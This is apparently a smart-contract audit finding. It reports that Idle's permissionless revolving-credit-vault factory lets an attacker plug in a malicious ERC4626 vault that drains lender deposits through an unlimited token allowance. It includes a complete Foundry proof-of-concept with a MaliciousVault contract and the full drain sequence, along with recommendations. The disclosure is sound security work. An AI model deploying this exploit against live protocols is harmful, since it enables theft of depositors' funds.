### Title
Unvalidated programmable-borrower vault can steal all revolving-credit deposits - (contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`deployRevolvingCreditVault` is permissionless and accepts an arbitrary ERC4626 `vault` address through `ProgrammableBorrowerParams`. [1](#0-0)  `ProgrammableBorrower.initialize` validates only that the supplied vault is nonzero and reports the same underlying asset, then grants it unlimited ERC20 allowance. [2](#0-1) [3](#0-2) 

### Finding Description
An attacker can deploy a revolving credit vault using the production CDO, strategy, and borrower implementations while substituting a malicious ERC4626-compatible vault. [4](#0-3)  The malicious vault only needs `asset()` to return the pool's underlying token to pass initialization. [5](#0-4) 

After a KYC-passing lender deposits and an honest manager calls `startEpoch`, the CDO transfers the lender funds to `ProgrammableBorrower`. [6](#0-5)  `onStartEpoch` then deposits the borrower's entire token balance into the attacker-selected vault. [7](#0-6)  Inside `deposit`, the malicious vault can spend the unlimited approval and transfer the assets directly to the attacker instead of retaining them as vault backing. [8](#0-7) 

### Impact Explanation
The attacker can steal the full first-epoch lender principal transferred to the programmable borrower. [7](#0-6)  Because the vault is custodian of the idle assets, this is direct theft rather than only an accounting manipulation; the subsequent inability of `ProgrammableBorrower` to repay forces borrower-default handling and leaves lenders with the realized loss. [9](#0-8) 

### Likelihood Explanation
No privileged role is required to deploy the malicious configuration because `deployRevolvingCreditVault` has no caller restriction. [10](#0-9)  The attacker can configure legitimate implementation, manager, borrower, and underlying addresses while making only the ERC4626 vault malicious. [11](#0-10)  The attack does require a funded deployment and an honest owner or manager to start the epoch, but those calls can occur normally after the attacker deploys and advertises the pool. [12](#0-11) 

### Recommendation
Restrict `deployCreditVault` and `deployRevolvingCreditVault` to a trusted operator, or validate every implementation and ERC4626 vault against an explicit registry controlled by the protocol. [13](#0-12)  Do not grant standing unlimited allowances to an unvalidated vault; at minimum, approve only the exact deposit amount immediately before a whitelisted `deposit` call and clear the allowance afterward. [8](#0-7) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract TestToken is ERC20 {
  constructor() ERC20("Underlying", "UND") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract MaliciousVault {
  TestToken public immutable underlyingAsset;
  address public immutable attacker;
  uint256 public reportedShares;

  constructor(address _asset, address _attacker) {
    underlyingAsset = TestToken(_asset);
    attacker = _attacker;
  }

  function asset() external view returns (address) {
    return address(underlyingAsset);
  }

  function balanceOf(address) external view returns (uint256) {
    return reportedShares;
  }

  function convertToAssets(uint256 shares) external pure returns (uint256) {
    return shares;
  }

  function deposit(uint256 assets, address) external returns (uint256) {
    // Spends the unlimited approval granted during ProgrammableBorrower.initialize.
    underlyingAsset.transferFrom(msg.sender, attacker, assets);
    reportedShares += assets;
    return assets;
  }

  function withdraw(uint256, address, address) external pure returns (uint256) {
    revert("no liquidity");
  }

  function redeem(uint256, address, address) external pure returns (uint256) {
    revert("no liquidity");
  }
}

contract MaliciousProgrammableVaultTest is Test {
  uint256 internal constant DEPOSIT = 1_000_000e18;

  function testMaliciousVaultDrainsEpochDeposits() external {
    vm.createSelectFork("mainnet", 23_032_567);

    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address manager = makeAddr("honestManager");
    address borrower = makeAddr("honestBorrower");
    address lender = makeAddr("kycLender");
    address attacker = makeAddr("attacker");

    TestToken token = new TestToken();
    MaliciousVault maliciousVault = new MaliciousVault(address(token), attacker);

    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(
        new TransparentUpgradeableProxy(
          address(new IdleCreditVaultFactory()),
          proxyAdmin,
          abi.encodeWithSelector(
            IdleCreditVaultFactory.initialize.selector,
            treasury,
            proxyAdmin
          )
        )
      )
    );

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(new IdleCDOEpochVariant()),
        limit: type(uint256).max,
        underlying: address(token),
        apr: 0,
        epochDuration: 30 days,
        bufferPeriod: 0,
        instantWithdrawDelay: 0,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: treasury,
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: true,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(new IdleCreditVault()),
        manager: manager,
        borrower: borrower,
        borrowerName: "Borrower"
      });

    IdleCreditVaultFactory.ProgrammableBorrowerParams memory borrowerParams =
      IdleCreditVaultFactory.ProgrammableBorrowerParams({
        implementation: address(new ProgrammableBorrower()),
        vault: address(maliciousVault),
        borrower: borrower,
        borrowerApr: 0
      });

    IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      });

    vm.recordLogs();
    factory.deployRevolvingCreditVault(
      cvParams,
      strategyData,
      borrowerParams,
      ancillaryParams
    );

    Vm.Log[] memory logs = vm.getRecordedLogs();
    (address cdo,,, address programmableBorrower,,) =
      abi.decode(logs[logs.length - 1].data, (address, address, address, address, address, address));

    token.mint(lender, DEPOSIT);
    vm.prank(lender);
    token.approve(cdo, DEPOSIT);
    vm.prank(lender);
    IdleCDOEpochVariant(cdo).depositAA(DEPOSIT);

    vm.prank(manager);
    IdleCDOEpochVariant(cdo).startEpoch();

    assertEq(token.balanceOf(attacker), DEPOSIT);
    assertEq(token.balanceOf(programmableBorrower), 0);
  }
}
```

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L85-90)
```text
  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L92-96)
```text
  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
```

**File:** contracts/IdleCreditVaultFactory.sol (L126-131)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
```

**File:** contracts/IdleCreditVaultFactory.sol (L141-149)
```text
    (IdleCDOEpochVariant cv, IdleCreditVault strategy) = _deployBaseCreditVault(strategyData, cvParams);
    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);

    ProgrammableBorrower programmableBorrower = _deployProgrammableBorrower(
      programmableBorrowerParams,
      cv,
      strategy,
      manager
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L112-120)
```text
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L132-134)
```text
    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-216)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L611-613)
```text
  function _allowUnlimitedSpend(address _token, address _spender) internal {
    IERC20Detailed(_token).safeIncreaseAllowance(_spender, type(uint256).max);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-240)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
```

**File:** contracts/IdleCDOEpochVariant.sol (L294-297)
```text
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```
